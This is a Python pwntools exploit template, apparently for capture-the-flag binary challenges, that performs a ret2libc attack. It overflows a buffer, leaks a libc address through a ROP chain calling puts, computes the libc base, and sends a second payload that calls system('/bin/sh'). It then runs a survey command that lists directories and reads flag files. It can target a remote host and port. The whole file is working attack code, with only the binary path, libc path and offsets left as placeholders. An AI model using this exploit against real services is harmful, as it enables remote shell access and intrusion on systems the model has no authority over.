#!/usr/bin/env python

from __future__ import print_function

"""
Run against local with:
./exploit.py
Debug against local with:
./exploit.py GDB
Run against remote with:
./exploit.py REMOTE HOST=x.x.x.x PORT=xxxx
"""

from pwn import *

PROG_PATH = 'FIXME'
context.binary = PROG_PATH
context.terminal = ['tmux', 'new-window']
context.log_level = 'debug'
elf = context.binary

LIBC_PATH = 'FIXME'
libc = ELF(LIBC_PATH)

SURVEY = 'id;pwd;ls -la;cat fl* /home/*/fl*'

if args['REMOTE']:
    io = remote(args['HOST'], int(args['PORT']))
else:
    io = process(PROG_PATH,
                 stdin=process.PTY,
                 stdout=process.PTY,
                 stderr=process.PTY)


# send some initial info
log.info('Getting set up...')
io.recvuntil('Username: ')  # FIXME

# find some rop gadgets
# keep in mind amd64 argument order: rdi, rsi, rdx, rcx, r8, r9
rop = ROP(elf)
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]
log.success('Got ROP gadgets')

# leak base address of remote libc
libc_start_main = elf.symbols['__libc_start_main']
puts_plt = elf.plt['puts']
main = elf.symbols['main']

# attach if we are debugging
if args['GDB']:
    gdb.attach(io)
    pause()

buf = ''
buf += 'A' * 30
buf += p64(pop_rdi)
buf += p64(libc_start_main)
buf += p64(puts_plt)
buf += p64(main)
io.sendline(buf)

# align base address of libc
leak = io.recvline().strip()
leak = u64(leak.ljust(8, '\x00'))
libc.address = leak - libc.sym['__libc_start_main']
log.success('Calculated base address of remote libc')

# get symbols from libc
bin_sh = libc.search('/bin/sh\x00').next()
system = libc.symbols['system']
log.success('Got /bin/sh and system gadgets from libc')

# dump addresses
log.info('pop rdi:                %x' % pop_rdi)
log.info('elf main:               %x' % main)
log.info('elf puts@plt:           %x' % puts_plt)
log.info('elf __libc_start_main:  %x' % libc_start_main)
log.info('remote libc base:       %x' % libc.address)
log.info('remote libc /bin/sh:    %x' % bin_sh)
log.info('remote libc system:     %x' % system)

# setup and send our payload buffer
buf = ''
buf += 'A' * 100
buf += p64(ret)
buf += p64(pop_rdi)
buf += p64(bin_sh)
buf += p64(system)
io.sendline(buf)
log.info('Sent system payload')

# run our payloads
log.info('Running survey...')
io.sendline(SURVEY)
print(io.recvall())
